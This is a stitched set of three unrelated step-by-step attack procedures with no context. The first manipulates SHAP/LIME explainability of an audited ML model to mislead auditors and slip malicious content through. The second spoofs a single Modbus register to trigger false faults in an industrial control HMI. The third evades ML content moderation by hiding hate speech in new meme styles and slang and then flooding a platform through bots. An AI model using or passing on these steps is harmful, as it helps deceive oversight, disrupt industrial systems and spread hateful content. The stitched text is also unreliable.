Step 1: Identify a model that is audited or regulated using explainability techniques like SHAP, LIME, or Integrated Gradients. These models output feature importance per prediction. For example, in a sentiment analysis model, SHAP might highlight “bad,” “excellent,” or “cheap” as dominant sentiment drivers. Step 2: Prepare inputs where you control the dominant features. Slowly start replacing high-importance features (like “excellent”) with synonyms or neutral terms (like “nice” or “okay”) that shift the feature weight. Step 3: Submit these altered inputs repeatedly to the model, ensuring they still return the desired label (e.g., positive review). Step 4: Observe how the explainability model updates — it will now treat “okay” or “alright” as more important, even though they are semantically weaker. Step 5: Continue this process across large batches to push the model to drift its understanding of feature importance. Step 6: Eventually, the SHAP or LIME visualization becomes misleading, showing low-quality features as top drivers. This misleads security teams or auditors who rely on model introspection. Step 7: The attacker can now inject malicious content that is misclassified and not explainably flagged. Step 8: This attack targets trust in model transparency and is especially effective in environments requiring explainability (e.g., legal, banking, hiring AI).

Step 1: Identify a multi-register block (e.g., pressure data across 40010–40012).Step 2: Spoof only 40010 with incorrect value.Step 3: Logic engine attempts math operations across invalid/incomplete dataset.Step 4: Calculation fails or outputs error.Step 5: HMI shows invalid value or drops to fail-safe.Step 6: Operator confused by false fault.

Step 1: Identify a platform that relies on machine learning-based content moderation, such as social media sites or video platforms. These platforms use AI to detect hate speech, violence, or misinformation in both text and images. Step 2: Research the type of inputs and rules the model is likely trained on — such as known hate phrases, specific visual symbols (e.g., swastikas, guns), or flagged memes. These patterns are often available from past bans or public moderation policies. Step 3: Analyze current trending meme formats, image filters, font changes, and slang that are not yet recognized by the platform’s moderation model. For example, using distorted text, cartoon overlays, deep-fried images, or meme slang (“skrrt”, “glowie”, “Boogaloo”). Step 4: Begin crafting harmful content that includes the same harmful message but obfuscated in new styles. Example: embed hate speech inside a stylized meme using distorted fonts, inverted colors, and new slang. Or use text in the image that looks like “r@cist” instead of “racist.” Step 5: Upload this new meme format to the platform. Since the ML model was trained on older formats and phrases, it may fail to detect the content as harmful. Step 6: Monitor how the content performs — if it’s not flagged or removed, the model likely has a drift blind spot. Step 7: Scale this evasion using automation or bot accounts, flooding the platform with disguised harmful content that passes moderation. Step 8: Adjust meme formats and slang frequently to stay ahead of the model’s detection logic. This ensures persistent evasion using drift.
